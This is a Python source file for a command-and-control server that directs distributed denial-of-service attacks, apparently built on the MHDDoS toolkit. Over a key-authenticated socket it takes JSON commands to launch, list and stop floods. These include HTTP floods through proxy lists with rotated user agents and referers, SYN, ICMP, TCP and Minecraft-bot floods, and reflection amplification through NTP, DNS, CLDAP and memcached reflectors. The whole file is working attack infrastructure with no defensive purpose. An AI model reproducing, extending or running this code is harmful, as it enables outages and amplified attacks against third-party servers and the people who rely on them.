import threading
import socket
import json
import math
from time import sleep, time
from threading import Event, Thread
from typing import Any
from pathlib import Path
from contextlib import suppress
from yarl import URL
from socket import (AF_INET, SOCK_STREAM)

from config.environment import __dir__, __ip__, logger, con
from core.tools import ToolsConsole, Methods, Tools, bcolors
from core.http_flood import HttpFlood
from core.layer4 import Layer4
from core.minecraft import Minecraft
from proxy.handlers import handleProxyList
from core.counters import REQUESTS_SENT, BYTES_SENT

class CNC:
    def __init__(self, host, port):
        self.host = host
        self.port = int(port)
        self.KEY = con['KEY'] # config.json
        
        self.attacks = {}
        self.servers = {}

        if self.port < 1 or self.port > 65535:
            raise ValueError(f"Invalid port: {self.port}")
        
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.sock.bind((self.host, self.port))
        except Exception as e:
            raise RuntimeError(f"Failed to bind port {self.port}: {e}") from e
            
        self.sock.listen(5)
        logger.info(f"CNC listening on {self.host}:{self.port}")

        while True:
            try:
                client, address = self.sock.accept()
                logger.info(f"Accepted connection from {address}")
                t = threading.Thread(target=self.handle_client, args=(client, address), daemon=True)
                t.start()
            except Exception as e:
                logger.warning(f"Failed to accept a new client: {e}")

    def send(self, sock, data, escape=True):
        if escape:
            data += '\r\n'
        try:
            sock.send(data.encode())
        except Exception as e:
            logger.debug(f"send() falhou: {e}")

    def send_json_response(self, sock, status, message, data=None):
        response = {
            "status": status,  # error / failed / success 
            "message": message,
            "data": data or {}
        }
        try:
            raw = (json.dumps(response) + '\n').encode()
            sock.send(raw)
        except Exception as e:
            logger.debug(f"send_json_response() falhou: {e}")

    def handle_client(self, client, address):
        try:
            self.send(client, 'auth', escape=False)

            key = client.recv(1024).decode(errors='ignore').strip()
            logger.info(f"Client {address} sent key: {key!r}")

            if key != self.KEY:
                self.send_json_response(client, "failed", "wrong key", {})
                try:
                    client.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                client.close()
                return

            self.send_json_response(client, "success", "success auth", {})

            try:
                ctrl_thread = threading.Thread(target=self.controller, args=(client,), daemon=True)
                ctrl_thread.start()
            except Exception as e:
                logger.warning(f"Erro ao iniciar controller thread: {e}")
                try:
                    client.close()
                except:
                    pass

        except Exception as e:
            logger.warning(f"Erro ao processar cliente {address}: {e}")
            try:
                client.close()
            except:
                pass

    def controller(self, client):
        try:
            while 1:
                data = client.recv(4096)
                if not data:
                    logger.info("client disconnected.")
                    break
                
                data = data.decode(errors='ignore').strip()
                if not data:
                    continue

                try:
                    parsed = json.loads(data)
                    print(json.dumps(parsed, indent=2, ensure_ascii=False))
                except Exception as e:
                    self.send_json_response(client, "error", "Failed to interpret response as JSON", {})
                    continue

                args = list(parsed.values())
                command = args[0].upper()

                if command == "LIST":
                    attacks = self.list_attacks()
                    self.send_json_response(client, "success", "attack running", {"data": attacks})
                    continue

                if command == "SEARCH":
                    UID = args[1].strip()
                    result = self.get_attack(UID)

                    if result:
                        self.send_json_response(client, "success", "attack found", {"data": result})
                    else:
                        self.send_json_response(client, "error", "attack not found", {"attack_id": UID})
                    continue

                if command == "STOP":
                    attack_id = args[1].strip()
                    if self.stop_attack_by_id(attack_id):
                        self.send_json_response(client, "success", "attack stoped", {"attack_id": attack_id})
                    else:
                        self.send_json_response(client, "error", "attack not found", {"attack_id": attack_id})
                    continue

                method = command
                targeturl = args[1]
                attack_id = None
                host = None
                port = None
                url = None
                event = Event()
                event.clear()
                target = None
                urlraw = args[1].strip()
                if not urlraw.startswith("http"):
                    urlraw = "http://" + urlraw

                if method not in Methods.ALL_METHODS:
                    self.send_json_response(client, "error", "Method not found", { "method": method })
                    continue
                
                try:
                    if method in Methods.LAYER7_METHODS:
                        url = URL(urlraw)
                        host = url.host

                        if method != "TOR":
                            try:
                                host = socket.gethostbyname(url.host)
                            except Exception as e:
                                self.send_json_response(client, "error", "Cannot resolve hostname", { "data": url.host, 'output': str(e) })
                                continue

                        attack_id = parsed.get('attack_id')
                        sign = parsed.get('sign')
                        threads = parsed.get('threads')
                        rpc = parsed.get('rpc')
                        timer = (parsed.get("duration") or parsed.get("time"))
                        proxy_ty = parsed.get('socks_type')
                        proxy_li = Path(__dir__ / "resources/proxies/" / parsed.get('proxylist'))
                        useragent_li = Path(__dir__ / "resources/useragent.txt")
                        referers_li = Path(__dir__ / "resources/referers.txt")
                        proxies: Any = set()

                        if not useragent_li.exists():
                            self.send_json_response(client, "error", "file", { "data": "The Useragent file doesn't exist" })
                            continue

                        if not referers_li.exists():
                            self.send_json_response(client, "error", "file", { "data": "The Referer file doesn't exist" })
                            continue

                        uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                        referers = set(a.strip() for a in referers_li.open("r+").readlines())

                        if not uagents:
                            self.send_json_response(client, "error", "file", { "data": "Empty Useragent File" })
                            continue

                        if not referers:
                            self.send_json_response(client, "error", "file", { "data": "Empty Referer File" })
                            continue

                        if threads > 1000:
                            logger.warning("Thread is higher than 1000")
                        if rpc > 100:
                            logger.warning("RPC (Request Pre Connection) is higher than 100")

                        proxies = handleProxyList(threads, con, proxy_li, proxy_ty, url)
                        
                        thread = Thread(target=self.layer7_runner, args=(url, target, port, host, method, threads, timer, rpc, event, uagents, referers, proxies, attack_id))
                        thread.start()

                        self.attacks.setdefault(sign, []).append({
                            "thread": thread,
                            "event": event,
                            "info": {
                                "attack_id": attack_id,
                                "method": method,
                                "target": args[1],
                                "port": port,
                                "time": timer,
                                "start_time": time(),
                                "sign": sign
                            }
                        })

                        self.send_json_response(client, "success", "Flood launched", {"attack_id": attack_id,"method": method,"target": targeturl,"port": port,"time": timer,"sign": sign
                        })
                except Exception as e:
                    logger.warning(f"Erro: {e}")

                if method in Methods.LAYER4_METHODS:
                    target = URL(urlraw)

                    port = target.port
                    target = target.host

                    try:
                        target = socket.gethostbyname(target)
                    except Exception as e:
                        self.send_json_response(client, "error", "Cannot resolve hostname", { "data": url.host, 'output': str(e) })
                        continue

                    if port > 65535 or port < 1:
                        self.send_json_response(client, "error", "Invalid Port", { "data": "Invalid Port [Min: 1 / Max: 65535]" })
                        continue

                    if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                            not ToolsConsole.checkRawSocket():
                        self.send_json_response(client, "error", "Sokcet Error", { "data": "Cannot Create Raw Socket" })
                        continue

                    if method in Methods.LAYER4_AMP:
                        logger.warning("this method need spoofable servers please check")
                        logger.warning("https://github.com/MHProDev/MHDDoS/wiki/Amplification-ddos-attack")

                    threads = int(args[2])
                    timer = int(args[3])
                    attack_id = str(args[4])
                    sign = str(args[5])
                    proxies = None
                    ref = None

                    if not port:
                        logger.warning("Port Not Selected, Set To Default: 80")
                        port = 80

                    if method in {"SYN", "ICMP"}:
                        __ip__ = __ip__

                    if len(args) >= 6:
                        argfour = args[4].strip()
                        if argfour:
                            refl_li = Path(__dir__ / "resources/amplification/" / argfour)
                            if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                                if not refl_li.exists():
                                    self.send_json_response(client, "error", "File Error", { "data": "The reflector file doesn't exist" })
                                    continue

                                ref = set(a.strip() for a in Tools.IP.findall(refl_li.open("r").read()))
                                if not ref:
                                    self.send_json_response(client, "error", "File Error", { "data": "Empty Reflector File" })
                                    continue
                                attack_id = str(args[5])
                                sign = str(args[6])

                            elif argfour.isdigit() and len(args) >= 7:
                                proxy_ty = int(argfour)
                                proxy_li = Path(__dir__ / "resources/proxies/" / args[5].strip())
                                proxies = handleProxyList(con, proxy_li, proxy_ty)
                                attack_id = str(args[6])
                                sign = str(args[7])
                                if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"}:
                                    self.send_json_response(client, "error", "Method Error", { "data": "this method cannot use for layer4 proxy" })
                                    continue

                            else:
                                logger.setLevel("DEBUG")
                    
                    protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                    
                    if method == "MCBOT":
                        with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                            Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                            Tools.send(s, Minecraft.data(b'\x00'))

                            protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                            protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
                            
                            if 47 < protocolid > 758:
                                protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
                    
                    thread = Thread(target=self.layer4_runner, args=(method, url, target, port, threads, timer, event, proxies, ref, protocolid, attack_id))
                    thread.start()

                    self.attacks.setdefault(sign, []).append({
                        "thread": thread,
                        "event": event,
                        "info": {
                            "attack_id": attack_id,
                            "method": method,
                            "target": args[1],
                            "port": port,
                            "time": timer,
                            "start_time": time(),
                            "sign": sign
                        }
                    })

                    self.send_json_response(client, "success", "Flood launched", {
                          "attack_id": attack_id,
                           "method": method,"target": args[1],
                           "port": port,"time": timer, "sign": sign
                        })

        except Exception as e:
            logger.warning(f"Erro: {e}")
        finally:
            try:
                client.close()
            except:
                pass

    def layer7_runner(self, url, target, port, host, method, threads, timer, rpc, event, uagents, referers, proxies, attack_id):
        event.set()
        for thread_id in range(threads):
            HttpFlood(thread_id, url, host, method, rpc, event, uagents, referers, proxies).start()

        ts = time()
        while time() < ts + timer and event.is_set():
            sleep(1)
            print(f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
                    (target or url.host,
                     port or (url.port or 80),
                     method,
                     Tools.humanformat(int(REQUESTS_SENT)),
                     Tools.humanbytes(int(BYTES_SENT)),
                     round((time() - ts) / timer * 100, 2)))
            REQUESTS_SENT.set(0)
            BYTES_SENT.set(0)

        event.clear()

        for key, entries in list(self.attacks.items()):
            new_entries = []
            for entry in entries:
                info = entry.get("info", {})
                if info.get("attack_id") == attack_id:
                    self.stop_attack_by_id(attack_id)
                    continue
                new_entries.append(entry)
            if new_entries:
                self.attacks[key] = new_entries
            else:
                self.attacks.pop(key, None)

    def layer4_runner(self, method, url, target, port, threads, timer, event, proxies, ref, protocolid, attack_id):
        event.set()
        for _ in range(threads):
            Layer4((target, port), ref, method, event, proxies, protocolid).start()

        ts = time()
        while time() < ts + timer and event.is_set():
            sleep(1)
            print(f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,{bcolors.WARNING} Method:{bcolors.OKBLUE} %s{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}' %
                    (target or url.host,
                     port or (url.port or 80),
                     method,
                     Tools.humanformat(int(REQUESTS_SENT)),
                     Tools.humanbytes(int(BYTES_SENT)),
                     round((time() - ts) / timer * 100, 2)))
            REQUESTS_SENT.set(0)
            BYTES_SENT.set(0)

        event.clear()

        for key, entries in list(self.attacks.items()):
            new_entries = []
            for entry in entries:
                info = entry.get("info", {})
                if info.get("attack_id") == attack_id:
                    self.stop_attack_by_id(attack_id)
                    continue
                new_entries.append(entry)
            if new_entries:
                self.attacks[key] = new_entries
            else:
                self.attacks.pop(key, None)

    def stop_attack_by_id(self, attack_identifier):
        success = False
        attack_identifier = str(attack_identifier)

        for key, entries in list(self.attacks.items()):
            new_entries = []
            for entry in entries:
                info = entry.get("info", {}) if isinstance(entry, dict) else (entry[2] if len(entry) == 3 else {})
                aid = str(info.get("attack_id")) if info.get("attack_id") is not None else None

                if aid == attack_identifier:
                    # parar só essa entrada
                    try:
                        thread = entry.get("thread") if isinstance(entry, dict) else (entry[0] if len(entry) >= 1 else None)
                        event = entry.get("event") if isinstance(entry, dict) else (entry[1] if len(entry) >= 2 else None)
                        if event:
                            event.clear()
                        if hasattr(thread, "terminate"):
                            thread.terminate()
                        elif hasattr(thread, "join"):
                            thread.join(timeout=1)
                        success = True
                    except Exception as e:
                        logger.debug(f"Failed stopping attack entry by id: {e}")
                else:
                    new_entries.append(entry)

            if new_entries:
                self.attacks[key] = new_entries
            else:
                self.attacks.pop(key, None)

        if success:
            return True

        if attack_identifier in self.attacks:
            entries = self.attacks.pop(attack_identifier, [])
            all_ok = True
            for entry in entries:
                try:
                    thread = entry.get("thread") if isinstance(entry, dict) else (entry[0] if len(entry) >= 1 else None)
                    event = entry.get("event") if isinstance(entry, dict) else (entry[1] if len(entry) >= 2 else None)
                    if event:
                        event.clear()
                    if hasattr(thread, "terminate"):
                        thread.terminate()
                    elif hasattr(thread, "join"):
                        thread.join(timeout=1)
                except Exception as e:
                    logger.debug(f"Failed stopping attack entry by sign(key): {e}")
                    all_ok = False
            return all_ok

        found_any = False
        for key, entries in list(self.attacks.items()):
            new_entries = []
            for entry in entries:
                info = entry.get("info", {}) if isinstance(entry, dict) else (entry[2] if len(entry) == 3 else {})
                sgn = str(info.get("sign")) if info.get("sign") is not None else None

                if sgn == attack_identifier:
                    found_any = True
                    try:
                        thread = entry.get("thread") if isinstance(entry, dict) else (entry[0] if len(entry) >= 1 else None)
                        event = entry.get("event") if isinstance(entry, dict) else (entry[1] if len(entry) >= 2 else None)
                        if event:
                            event.clear()
                        if hasattr(thread, "terminate"):
                            thread.terminate()
                        elif hasattr(thread, "join"):
                            thread.join(timeout=1)
                    except Exception as e:
                        logger.debug(f"Failed stopping attack entry by sign(info): {e}")
                else:
                    new_entries.append(entry)

            if new_entries:
                self.attacks[key] = new_entries
            else:
                self.attacks.pop(key, None)

        return found_any

    def list_attacks(self):
        running = []
        for attack_key, processes in self.attacks.items():
            for entry in processes:
                info = entry.get("info", {})
                event = entry.get("event")

                remaining = None
                if "time" in info and "start_time" in info:
                    elapsed = time() - info["start_time"]
                    rem = max(0, info["time"] - elapsed)
                    remaining = int(math.ceil(rem))

                running.append({
                    "attack_id": info.get("attack_id", attack_key),
                    "method": info.get("method"),
                    "target": info.get("target"),
                    "port": info.get("port"),
                    "time": info.get("time"),
                    "sign": info.get("sign"),
                    "running": bool(event.is_set()) if hasattr(event, "is_set") else False,
                    "remaining": remaining
                })
        return running
    
    def get_attack(self, sign):
        details = []
        for attack_key, processes in self.attacks.items():
            for entry in processes:
                info = entry.get("info", {})
                event = entry.get("event")

                if info.get("sign") == sign or info.get("attack_id") == sign or attack_key == sign:
                    remaining = None
                    if "time" in info and "start_time" in info:
                        elapsed = time() - info["start_time"]
                        rem = max(0, info["time"] - elapsed)
                        remaining = int(math.ceil(rem))

                    details.append({
                        "attack_id": info.get("attack_id", attack_key),
                        "sign": info.get("sign"),
                        "method": info.get("method"),
                        "target": info.get("target"),
                        "port": info.get("port"),
                        "time": info.get("time"),
                        "running": bool(event.is_set()) if hasattr(event, "is_set") else False,
                        "remaining": remaining
                    })
        return details or {}


